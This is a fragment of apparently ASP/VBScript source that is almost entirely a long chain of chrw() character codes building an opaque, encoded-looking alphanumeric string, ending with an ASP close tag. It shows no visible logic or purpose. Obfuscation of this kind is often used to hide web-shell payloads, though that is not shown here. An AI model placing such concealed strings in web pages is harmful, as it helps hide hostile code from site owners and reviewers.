hrw(119)&chrw(110)&chrw(89)&chrw(66)&chrw(117)&chrw(49)&chrw(57)&chrw(121)&chrw(82)&chrw(53)&chrw(88)&chrw(119)&chrw(52)&chrw(105)&chrw(69)&chrw(83)&chrw(57)&chrw(101)&chrw(104)&chrw(111)&chrw(101)&chrw(52)&chrw(48)&chrw(71)&chrw(50)&chrw(79)&chrw(121)&chrw(68)&chrw(97)&chrw(86)&chrw(84)&chrw(73)&chrw(86)&chrw(74)&chrw(67)&chrw(66)&chrw(68)&chrw(50)&chrw(100)&chrw(84)&chrw(48)&chrw(120)&chrw(73)&chrw(101)&chrw(121)&chrw(102)&chrw(76)&chrw(101)&chrw(65)&chrw(83)&chrw(113)&chrw(118)&chrw(122)&chrw(101)&chrw(79)&chrw(98)&chrw(105)&chrw(108)&chrw(79)&chrw(52)&chrw(113)&chrw(108)&chrw(106)&chrw(111)&chrw(112)&chrw(86)&chrw(73)&chrw(70)&chrw(109)&chrw(85)&chrw(117)&chrw(109)&chrw(55)&chrw(110)&chrw(79)&chrw(81)&chrw(78)&chrw(67)&chrw(112)&chrw(105)&chrw(55)&chrw(65)&chrw(71)&chrw(54)&chrw(75)&chrw(79)&chrw(85)&chrw(48)&chrw(49)&chrw(109)&chrw(104)&chrw(120)&chrw(117)&chrw(89)&chrw(104)&chrw(72)&chrw(108)&chrw(69)&chrw(119)&chrw(106)&chrw(57)&chrw(117)&chrw(104)&chrw(115)&chrw(105)&chrw(83)&chrw(68)&chrw(121)&chrw(81)&chrw(122)&chrw(102)&chrw(87)&chrw(110)&chrw(48)&chrw(65)&chrw(69)&chrw(89)&chrw(74)&chrw(84)&chrw(89)&chrw(68)&chrw(72)&chrw(83)&chrw(65)&chrw(110)&chrw(114)&chrw(88)&chrw(102)&chrw(86)&chrw(99)&chrw(56)&chrw(50)&chrw(69)&chrw(98)&chrw(85)&chrw(90)&chrw(108)&chrw(65)&chrw(76)&chrw(73)&chrw(102)&chrw(49)&chrw(98)&chrw(114)&chrw(76)&chrw(72)&chrw(78)&chrw(82)&chrw(109)&chrw(70)&chrw(97)&chrw(111)&chrw(48)&chrw(117)&chrw(88)&chrw(110)&chrw(83)&chrw(52)&chrw(66)&chrw(87)&chrw(74)&chrw(88)&chrw(110)&chrw(119)&chrw(118)&chrw(77)&chrw(67)&chrw(122)&chrw(81)&chrw(53)&chrw(56)&chrw(50)&chrw(84)&chrw(66)&chrw(74)&chrw(69)&chrw(116)&chrw(121)&chrw(104)&chrw(82)&chrw(108)&chrw(68)&chrw(98)&chrw(119)&chrw(72)&chrw(68)&chrw(53)&chrw(50)&chrw(90)&chrw(100)&chrw(101)&chrw(49)&chrw(71)&chrw(108)&chrw(55)&chrw(71)&chrw(72)&chrw(121)&chrw(79)&chrw(82)&chrw(109)&chrw(52)&chrw(103)&chrw(115)&chrw(78)&chrw(80)&chrw(68)&chrw(99)&chrw(52)&chrw(120)&chrw(105)&chrw(52)&chrw(88)&chrw(74)&chrw(98)&chrw(81)&chrw(71)&chrw(86)&chrw(81)&chrw(106)&chrw(74)&chrw(116)&chrw(66)&chrw(99)&chrw(83)&chrw(84)&chrw(105)&chrw(83)&chrw(84)&chrw(86)&chrw(48)&chrw(51)&chrw(55)&chrw(88)&chrw(115)&chrw(109)&chrw(103)&chrw(51)&chrw(54)&chrw(89)&chrw(52)&chrw(103)&chrw(81)&chrw(89)&chrw(78)&chrw(83)&chrw(114)&chrw(88)&chrw(110)&chrw(88)&chrw(117)&chrw(113)&chrw(85)&chrw(112)&chrw(108)&chrw(73)&chrw(118)&chrw(52)&chrw(87)&chrw(89)&chrw(76)&chrw(116)&chrw(120)&chrw(107)&chrw(110)&chrw(82)&chrw(90)&chrw(76)&chrw(122)&chrw(77)&chrw(81)&chrw(74)&chrw(98)&chrw(87)&chrw(90)&chrw(122)&chrw(115)&chrw(88)&chrw(82)&chrw(117)&chrw(69)&chrw(74)&chrw(52)&chrw(76)&chrw(69)&chrw(117)&chrw(81)&chrw(70)&chrw(53)&chrw(48)&chrw(79)&chrw(65)&chrw(104)&chrw(109)&chrw(99)&chrw(112)&chrw(84)&chrw(106)&chrw(116)&chrw(83)&chrw(103)&chrw(66)&chrw(53)&chrw(52)&chrw(74)&chrw(102)&chrw(65)&chrw(120)&chrw(86)&chrw(89)&chrw(50)&chrw(82)&chrw(115)&chrw(89)&chrw(73)&chrw(114)&chrw(90)&chrw(111)&chrw(122)&chrw(69)&chrw(73)&chrw(86)&chrw(107)&chrw(97)&chrw(69)&chrw(90)&chrw(53)&chrw(101)&chrw(78)&chrw(90)&chrw(52)&chrw(116))

%>